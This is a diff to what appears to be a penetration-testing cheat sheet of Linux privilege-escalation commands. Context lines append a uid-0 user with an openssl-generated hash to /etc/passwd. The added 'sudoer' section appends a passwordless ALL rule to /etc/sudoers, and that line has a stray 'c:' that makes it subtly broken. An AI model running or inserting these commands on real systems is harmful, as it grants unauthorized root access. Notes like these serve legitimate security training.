@@ -91,6 +91,7 @@
   - [Linux](#linux-3)
     - [SUGGEST](#suggest)
     - [/etc/passwd](#etcpasswd)
+    - [sudoer](#sudoer)
     - [Kernel Ecpliot](#kernel-ecpliot)
 - [Transfer](#transfer)
   - [Port Forwading](#port-forwading)
@@ -1084,6 +1085,12 @@ joe@debian-privesc:~$ openssl passwd w00t
 joe@debian-privesc:~$ openssl passwd -1 w00t
 Fdzt.eqJQ4s0g
 joe@debian-privesc:~$ echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
+```
+
+### sudoer
+```bash
+LFILE='/etc/sudoers'
+echo username ALL=(ALL) NOPASSWD: ALL >> c:$LFILE 
 ```
 
 ### Kernel Ecpliot
